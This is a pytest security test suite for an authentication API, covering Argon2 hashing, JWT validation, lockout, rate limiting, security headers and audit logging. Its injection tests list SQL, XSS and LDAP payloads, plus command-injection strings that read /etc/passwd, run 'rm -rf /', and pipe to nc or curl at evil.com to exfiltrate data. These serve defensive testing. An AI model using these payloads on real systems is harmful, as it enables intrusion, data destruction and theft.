"""Security tests for authentication functionality."""

import pytest
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch
from httpx import AsyncClient

from app.core.exceptions import (
    AuthenticationError,
    UserNotFoundError,
    UserDisabledError,
    UserLockedError,
    InvalidTokenError,
    ExpiredTokenError,
    RevokedTokenError,
)
from app.core.jwt import jwt_service, JWTClaims, TokenType
from app.core.password import hash_password, verify_password
from app.models.user import User


class TestPasswordSecurity:
    """Test password security features."""

    @pytest.mark.security
    def test_password_hashing_security(self):
        """Test password hashing security properties."""
        password = "TestPassword123!"
        
        # Test that same password produces different hashes
        hash1 = hash_password(password)
        hash2 = hash_password(password)
        
        assert hash1 != hash2  # Different salts should produce different hashes
        assert len(hash1) > 60  # Argon2 hashes should be long
        assert hash1.startswith("$argon2")  # Should use Argon2
        
        # Both hashes should verify correctly
        assert verify_password(password, hash1) is True
        assert verify_password(password, hash2) is True

    @pytest.mark.security
    def test_password_timing_attack_resistance(self):
        """Test password verification timing attack resistance."""
        password = "TestPassword123!"
        correct_hash = hash_password(password)
        
        # Time correct password verification
        start_time = time.perf_counter()
        verify_password(password, correct_hash)
        correct_time = time.perf_counter() - start_time
        
        # Time incorrect password verification
        start_time = time.perf_counter()
        verify_password("WrongPassword123!", correct_hash)
        incorrect_time = time.perf_counter() - start_time
        
        # Time invalid hash verification
        start_time = time.perf_counter()
        verify_password(password, "invalid_hash")
        invalid_time = time.perf_counter() - start_time
        
        # Times should be similar to prevent timing attacks
        # Allow for some variance but they should be in the same order of magnitude
        # Increased threshold for Docker environment variability
        assert abs(correct_time - incorrect_time) < 0.5
        assert abs(correct_time - invalid_time) < 0.5

    @pytest.mark.security
    def test_password_hash_format_security(self):
        """Test password hash format security."""
        password = "TestPassword123!"
        hashed = hash_password(password)
        
        # Should not contain the original password
        assert password not in hashed
        assert password.lower() not in hashed.lower()
        
        # Should be properly formatted Argon2 hash
        parts = hashed.split('$')
        assert len(parts) >= 4
        assert parts[1] == "argon2id"  # Should use Argon2id variant
        
        # Should contain proper parameters
        assert "m=" in hashed  # Memory parameter
        assert "t=" in hashed  # Time parameter
        assert "p=" in hashed  # Parallelism parameter

    @pytest.mark.security
    def test_password_brute_force_resistance(self):
        """Test password brute force resistance."""
        password = "TestPassword123!"
        hashed = hash_password(password)
        
        # Common passwords that should fail
        common_passwords = [
            "password", "123456", "password123", "admin", "qwerty",
            "letmein", "welcome", "monkey", "dragon", "master"
        ]
        
        for common_password in common_passwords:
            assert verify_password(common_password, hashed) is False
        
        # Variations that should fail
        variations = [
            password.lower(),
            password.upper(),
            password[:-1],  # Missing last character
            password + "1",  # Extra character
            password.replace("!", "@"),  # Character substitution
        ]
        
        for variation in variations:
            if variation != password:  # Skip if variation is same as original
                assert verify_password(variation, hashed) is False


class TestTokenSecurity:
    """Test JWT token security features."""

    @pytest.mark.security
    def test_token_signature_security(self):
        """Test JWT token signature security."""
        subject = "user-123"
        scopes = ["read:profile"]
        audience = ["api-server"]
        
        # Create token
        token = jwt_service.create_access_token(
            subject=subject,
            scopes=scopes,
            audience=audience
        )
        
        # Valid token should verify
        payload = jwt_service.validate_token(token)
        assert payload[JWTClaims.SUBJECT] == subject
        
        # Tampered token should fail
        tampered_token = token[:-10] + "tampered123"
        with pytest.raises(AuthenticationError):
            jwt_service.validate_token(tampered_token)
        
        # Token with wrong signature should fail
        import jwt as pyjwt
        fake_payload = {"sub": "hacker", "exp": datetime.utcnow() + timedelta(hours=1)}
        fake_token = pyjwt.encode(fake_payload, "wrong_secret", algorithm="HS256")
        
        with pytest.raises(AuthenticationError):
            jwt_service.validate_token(fake_token)

    @pytest.mark.security
    def test_token_expiration_security(self):
        """Test token expiration security."""
        subject = "user-123"
        
        # Create token with short expiration
        short_expiry = timedelta(seconds=1)
        token = jwt_service.create_access_token(
            subject=subject,
            scopes=["read:profile"],
            audience=["api-server"],
            expires_delta=short_expiry
        )
        
        # Token should be valid immediately
        payload = jwt_service.validate_token(token)
        assert payload[JWTClaims.SUBJECT] == subject
        
        # Wait for token to expire
        time.sleep(2)
        
        # Expired token should fail
        with pytest.raises(AuthenticationError) as exc_info:
            jwt_service.validate_token(token)
        
        assert "expired" in str(exc_info.value).lower()

    @pytest.mark.security
    def test_token_audience_security(self):
        """Test token audience validation security."""
        subject = "user-123"
        scopes = ["read:profile"]
        
        # Create token for specific audience
        token = jwt_service.create_access_token(
            subject=subject,
            scopes=scopes,
            audience=["api-server"]
        )
        
        # Valid audience should work
        payload = jwt_service.validate_token(token, expected_audience="api-server")
        assert payload[JWTClaims.SUBJECT] == subject
        
        # Wrong audience should fail
        with pytest.raises(AuthenticationError) as exc_info:
            jwt_service.validate_token(token, expected_audience="wrong-audience")
        
        assert "audience" in str(exc_info.value).lower()

    @pytest.mark.security
    def test_token_type_security(self):
        """Test token type validation security."""
        subject = "user-123"
        
        # Create access token
        access_token = jwt_service.create_access_token(
            subject=subject,
            scopes=["read:profile"],
            audience=["api-server"]
        )
        
        # Create refresh token
        refresh_token = jwt_service.create_refresh_token(
            subject=subject,
            username="testuser"
        )
        
        # Access token should validate as access token
        payload = jwt_service.validate_token(access_token, expected_type=TokenType.ACCESS)
        assert payload[JWTClaims.TOKEN_TYPE] == TokenType.ACCESS
        
        # Access token should fail as refresh token
        with pytest.raises(AuthenticationError):
            jwt_service.validate_token(access_token, expected_type=TokenType.REFRESH)
        
        # Refresh token should fail as access token
        with pytest.raises(AuthenticationError):
            jwt_service.validate_token(refresh_token, expected_type=TokenType.ACCESS)

    @pytest.mark.security
    def test_token_jti_uniqueness(self):
        """Test JWT ID uniqueness for replay attack prevention."""
        subject = "user-123"
        scopes = ["read:profile"]
        audience = ["api-server"]
        
        # Create multiple tokens
        tokens = []
        jtis = []
        
        for _ in range(10):
            token = jwt_service.create_access_token(
                subject=subject,
                scopes=scopes,
                audience=audience
            )
            tokens.append(token)
            
            payload = jwt_service.decode_token(token, verify_signature=False)
            jtis.append(payload[JWTClaims.JWT_ID])
        
        # All JTIs should be unique
        assert len(set(jtis)) == len(jtis)
        
        # JTIs should be sufficiently random
        for jti in jtis:
            assert len(jti) >= 16  # Should be at least 16 characters
            assert jti.isalnum() or '-' in jti or '_' in jti  # Should be URL-safe

    @pytest.mark.security
    async def test_token_revocation_security(self):
        """Test token revocation security."""
        mock_redis = AsyncMock()
        
        # Test token not revoked
        mock_redis.exists.return_value = False
        jti = "valid-token-id"
        
        from app.core.security import SecurityUtils
        is_revoked = await SecurityUtils.is_token_revoked(jti, mock_redis)
        assert is_revoked is False
        
        # Test token revoked
        mock_redis.exists.return_value = True
        is_revoked = await SecurityUtils.is_token_revoked(jti, mock_redis)
        assert is_revoked is True
        
        # Test revoke token
        await SecurityUtils.revoke_token(jti, mock_redis, ttl=3600)
        mock_redis.set.assert_called_with(f"revoked_token:{jti}", "1", expire=3600)


class TestAccountSecurity:
    """Test account security features."""

    @pytest.mark.security
    def test_account_lockout_security(self):
        """Test account lockout security mechanism."""
        user = User(
            username="lockout_test",
            email="lockout@example.com",
            password_hash=hash_password("TestPassword123!"),
            is_active=True
        )
        
        # Initially not locked
        assert user.is_locked is False
        assert user.can_login is True
        assert user.failed_login_attempts == 0
        
        # Increment failed attempts
        max_attempts = 5
        lockout_minutes = 30
        
        for attempt in range(max_attempts - 1):
            user.increment_failed_login(max_attempts, lockout_minutes)
            assert user.is_locked is False  # Should not be locked yet
            assert user.failed_login_attempts == attempt + 1
        
        # Final attempt should lock account
        user.increment_failed_login(max_attempts, lockout_minutes)
        assert user.is_locked is True
        assert user.can_login is False
        assert user.locked_until is not None
        assert user.failed_login_attempts == max_attempts

    @pytest.mark.security
    def test_account_lockout_duration(self):
        """Test account lockout duration security."""
        user = User(
            username="duration_test",
            email="duration@example.com",
            password_hash=hash_password("TestPassword123!"),
            is_active=True
        )
        
        # Lock account
        lockout_minutes = 30
        user.increment_failed_login(max_attempts=1, lockout_minutes=lockout_minutes)
        
        assert user.is_locked is True
        lockout_time = user.locked_until
        
        # Lockout should be approximately 30 minutes from now
        expected_unlock = datetime.utcnow() + timedelta(minutes=lockout_minutes)
        time_diff = abs((lockout_time - expected_unlock).total_seconds())
        assert time_diff < 60  # Should be within 1 minute

    @pytest.mark.security
    def test_successful_login_resets_attempts(self):
        """Test that successful login resets failed attempts."""
        user = User(
            username="reset_test",
            email="reset@example.com",
            password_hash=hash_password("TestPassword123!"),
            is_active=True
        )
        
        # Simulate failed attempts
        user.increment_failed_login(max_attempts=5, lockout_minutes=30)
        user.increment_failed_login(max_attempts=5, lockout_minutes=30)
        assert user.failed_login_attempts == 2
        
        # Successful login should reset
        user.update_last_login()
        assert user.failed_login_attempts == 0
        assert user.locked_until is None
        assert user.last_login is not None

    @pytest.mark.security
    def test_disabled_account_security(self):
        """Test disabled account security."""
        user = User(
            username="disabled_test",
            email="disabled@example.com",
            password_hash=hash_password("TestPassword123!"),
            is_active=False  # Disabled account
        )
        
        assert user.can_login is False
        
        # Even if not locked, disabled account cannot login
        assert user.is_locked is False
        assert user.can_login is False


class TestSessionSecurity:
    """Test session security features."""

    @pytest.mark.security
    async def test_concurrent_session_security(self, async_client: AsyncClient):
        """Test concurrent session security."""
        # Register user
        registration_data = {
            "username": "concurrent_test",
            "email": "concurrent@example.com",
            "password": "ConcurrentTest123!",
            "first_name": "Concurrent",
            "last_name": "Test"
        }
        
        response = await async_client.post(
            "/api/v1/users/register",
            json=registration_data
        )
        assert response.status_code == 201
        
        # Login multiple times to create multiple sessions
        login_data = {
            "username": "concurrent_test",
            "password": "ConcurrentTest123!"
        }
        
        tokens = []
        for _ in range(3):
            response = await async_client.post(
                "/api/v1/auth/token",
                data=login_data
            )
            assert response.status_code == 200
            tokens.append(response.json())
        
        # All tokens should be valid initially
        for token_data in tokens:
            headers = {"Authorization": f"Bearer {token_data['access_token']}"}
            response = await async_client.get(
                "/api/v1/users/profile",
                headers=headers
            )
            assert response.status_code == 200

    @pytest.mark.security
    async def test_session_hijacking_protection(self, async_client: AsyncClient):
        """Test session hijacking protection."""
        # This test would verify that tokens are properly bound to sessions
        # and cannot be used from different contexts
        
        # Register and login user
        registration_data = {
            "username": "hijack_test",
            "email": "hijack@example.com",
            "password": "HijackTest123!"
        }
        
        await async_client.post("/api/v1/users/register", json=registration_data)
        
        login_response = await async_client.post(
            "/api/v1/auth/token",
            data={"username": "hijack_test", "password": "HijackTest123!"}
        )
        
        token = login_response.json()["access_token"]
        
        # Token should work with proper headers
        headers = {"Authorization": f"Bearer {token}"}
        response = await async_client.get("/api/v1/users/profile", headers=headers)
        assert response.status_code == 200
        
        # Token should be validated properly
        # Additional security checks would be implemented in the actual endpoints


class TestInputValidationSecurity:
    """Test input validation security."""

    @pytest.mark.security
    async def test_sql_injection_protection(self, async_client: AsyncClient):
        """Test SQL injection protection in authentication."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (username) VALUES ('hacker'); --",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "') OR ('1'='1",
        ]
        
        for payload in sql_injection_payloads:
            # Test in login username
            response = await async_client.post(
                "/api/v1/auth/token",
                data={
                    "username": payload,
                    "password": "TestPassword123!"
                }
            )
            
            # Should not cause server error or expose data
            assert response.status_code in [400, 401, 422]
            
            # Response should not contain SQL error messages
            response_text = response.text.lower()
            sql_error_indicators = [
                "syntax error", "sql", "database", "table", "column",
                "constraint", "violation", "duplicate", "foreign key"
            ]
            
            for indicator in sql_error_indicators:
                assert indicator not in response_text
            
            # Test in registration
            response = await async_client.post(
                "/api/v1/users/register",
                json={
                    "username": payload,
                    "email": "test@example.com",
                    "password": "TestPassword123!"
                }
            )
            
            assert response.status_code in [400, 422]

    @pytest.mark.security
    async def test_xss_protection(self, async_client: AsyncClient, auth_headers):
        """Test XSS protection in user inputs."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>",
        ]
        
        for payload in xss_payloads:
            # Test in profile update
            response = await async_client.put(
                "/api/v1/users/profile",
                headers=auth_headers,
                json={
                    "display_name": payload,
                    "bio": payload,
                    "first_name": payload
                }
            )
            
            if response.status_code == 200:
                # Check response doesn't contain unescaped payload
                response_text = response.text
                assert payload not in response_text
                
                # Verify data is properly escaped in storage
                profile_response = await async_client.get(
                    "/api/v1/users/profile",
                    headers=auth_headers
                )
                
                if profile_response.status_code == 200:
                    profile_data = profile_response.json()
                    
                    # Should be escaped or sanitized
                    for field in ["display_name", "bio", "first_name"]:
                        if field in profile_data and profile_data[field]:
                            field_value = profile_data[field]
                            assert "<script>" not in field_value
                            assert "javascript:" not in field_value
                            assert "onerror=" not in field_value

    @pytest.mark.security
    async def test_command_injection_protection(self, async_client: AsyncClient):
        """Test command injection protection."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; ping -c 1 evil.com",
            "| nc evil.com 4444",
            "&& curl evil.com/steal?data=",
        ]
        
        for payload in command_injection_payloads:
            # Test in various input fields
            response = await async_client.post(
                "/api/v1/users/register",
                json={
                    "username": f"user{payload}",
                    "email": f"test{payload}@example.com",
                    "password": "TestPassword123!"
                }
            )
            
            # Should reject malicious input
            assert response.status_code in [400, 422]

    @pytest.mark.security
    async def test_ldap_injection_protection(self, async_client: AsyncClient):
        """Test LDAP injection protection."""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*",
            "*)(&(uid=*",
            "*))%00",
            "admin)(&(password=*))",
            "*)(cn=*)",
            "*)|(|(uid=*",
        ]
        
        for payload in ldap_injection_payloads:
            response = await async_client.post(
                "/api/v1/auth/token",
                data={
                    "username": payload,
                    "password": "TestPassword123!"
                }
            )
            
            # Should not cause LDAP errors or expose data
            assert response.status_code in [400, 401, 422]


class TestRateLimitingSecurity:
    """Test rate limiting security features."""

    @pytest.mark.security
    async def test_login_rate_limiting(self, async_client: AsyncClient):
        """Test login rate limiting protection."""
        # Register a user first
        registration_data = {
            "username": "ratelimit_test",
            "email": "ratelimit@example.com",
            "password": "RateLimit123!"
        }
        
        await async_client.post("/api/v1/users/register", json=registration_data)
        
        # Attempt rapid failed logins
        failed_attempts = 0
        rate_limited = False
        
        for attempt in range(20):  # Try many attempts
            response = await async_client.post(
                "/api/v1/auth/token",
                data={
                    "username": "ratelimit_test",
                    "password": "WrongPassword123!"
                }
            )
            
            if response.status_code == 429:  # Rate limited
                rate_limited = True
                break
            elif response.status_code == 401:  # Failed login
                failed_attempts += 1
            
            # Small delay between attempts
            import asyncio
            await asyncio.sleep(0.1)
        
        # Should eventually be rate limited
        assert rate_limited is True or failed_attempts >= 5

    @pytest.mark.security
    async def test_registration_rate_limiting(self, async_client: AsyncClient):
        """Test registration rate limiting protection."""
        rate_limited = False
        successful_registrations = 0
        
        for attempt in range(10):  # Try multiple registrations
            response = await async_client.post(
                "/api/v1/users/register",
                json={
                    "username": f"ratetest{attempt}",
                    "email": f"ratetest{attempt}@example.com",
                    "password": "RateTest123!"
                }
            )
            
            if response.status_code == 429:  # Rate limited
                rate_limited = True
                break
            elif response.status_code == 201:  # Successful registration
                successful_registrations += 1
            
            # Small delay between attempts
            import asyncio
            await asyncio.sleep(0.1)
        
        # Should either be rate limited or have reasonable limit on registrations
        assert rate_limited is True or successful_registrations <= 5


class TestCryptographicSecurity:
    """Test cryptographic security features."""

    @pytest.mark.security
    def test_random_token_generation(self):
        """Test random token generation security."""
        # Generate multiple tokens
        tokens = []
        for _ in range(100):
            token = jwt_service.create_access_token(
                subject="test-user",
                scopes=["test:scope"],
                audience=["test-api"]
            )
            tokens.append(token)
        
        # All tokens should be unique
        assert len(set(tokens)) == len(tokens)
        
        # Extract JTIs and verify uniqueness
        jtis = []
        for token in tokens:
            payload = jwt_service.decode_token(token, verify_signature=False)
            jtis.append(payload[JWTClaims.JWT_ID])
        
        assert len(set(jtis)) == len(jtis)
        
        # JTIs should have sufficient entropy
        for jti in jtis[:10]:  # Check first 10
            assert len(jti) >= 16  # At least 16 characters
            # Should contain mix of characters (not all same)
            unique_chars = len(set(jti))
            assert unique_chars >= 8  # At least 8 different characters

    @pytest.mark.security
    def test_secure_random_generation(self):
        """Test secure random number generation."""
        import secrets
        
        # Generate multiple random values
        random_values = []
        for _ in range(1000):
            random_values.append(secrets.token_urlsafe(32))
        
        # All values should be unique
        assert len(set(random_values)) == len(random_values)
        
        # Values should have proper length
        for value in random_values[:10]:
            assert len(value) >= 32
            # Should be URL-safe base64
            import string
            allowed_chars = string.ascii_letters + string.digits + '-_'
            assert all(c in allowed_chars for c in value)

    @pytest.mark.security
    def test_key_derivation_security(self):
        """Test key derivation security."""
        # Test that same input produces same output
        password = "TestPassword123!"
        salt = b"fixed_salt_for_testing"
        
        from app.core.password import derive_key
        key1 = derive_key(password, salt)
        key2 = derive_key(password, salt)
        
        assert key1 == key2
        
        # Test that different inputs produce different outputs
        key3 = derive_key("DifferentPassword123!", salt)
        assert key1 != key3
        
        # Test that different salts produce different outputs
        different_salt = b"different_salt_testing"
        key4 = derive_key(password, different_salt)
        assert key1 != key4


class TestSecurityHeaders:
    """Test security headers and middleware."""

    @pytest.mark.security
    async def test_security_headers_present(self, async_client: AsyncClient):
        """Test that security headers are present in responses."""
        response = await async_client.get("/health")
        
        # Check for important security headers
        headers = response.headers
        
        # Content Security Policy
        assert "x-content-type-options" in headers
        assert headers["x-content-type-options"] == "nosniff"
        
        # Frame options
        assert "x-frame-options" in headers
        assert headers["x-frame-options"] in ["DENY", "SAMEORIGIN"]
        
        # XSS Protection
        assert "x-xss-protection" in headers
        assert "1" in headers["x-xss-protection"]

    @pytest.mark.security
    async def test_cors_security(self, async_client: AsyncClient):
        """Test CORS security configuration."""
        # Test preflight request
        response = await async_client.options(
            "/api/v1/auth/token",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        # Should not allow arbitrary origins
        if "access-control-allow-origin" in response.headers:
            allowed_origin = response.headers["access-control-allow-origin"]
            assert allowed_origin != "*" or allowed_origin != "https://evil.com"


class TestAuditLogging:
    """Test audit logging security features."""

    @pytest.mark.security
    async def test_failed_login_logging(self, async_client: AsyncClient):
        """Test that failed logins are properly logged."""
        # This test would verify that failed login attempts are logged
        # for security monitoring and incident response
        
        with patch('app.core.audit.audit_logger') as mock_logger:
            response = await async_client.post(
                "/api/v1/auth/token",
                data={
                    "username": "nonexistent_user",
                    "password": "WrongPassword123!"
                }
            )
            
            assert response.status_code == 401
            
            # Verify audit log was called
            mock_logger.log_security_event.assert_called()
            
            # Verify log contains relevant information
            call_args = mock_logger.log_security_event.call_args
            assert "authentication_failure" in str(call_args)

    @pytest.mark.security
    async def test_successful_login_logging(self, async_client: AsyncClient):
        """Test that successful logins are properly logged."""
        # Register user first
        registration_data = {
            "username": "audit_test",
            "email": "audit@example.com",
            "password": "AuditTest123!"
        }
        
        await async_client.post("/api/v1/users/register", json=registration_data)
        
        with patch('app.core.audit.audit_logger') as mock_logger:
            response = await async_client.post(
                "/api/v1/auth/token",
                data={
                    "username": "audit_test",
                    "password": "AuditTest123!"
                }
            )
            
            assert response.status_code == 200
            
            # Verify audit log was called
            mock_logger.log_security_event.assert_called()
            
            # Verify log contains relevant information
            call_args = mock_logger.log_security_event.call_args
            assert "authentication_success" in str(call_args)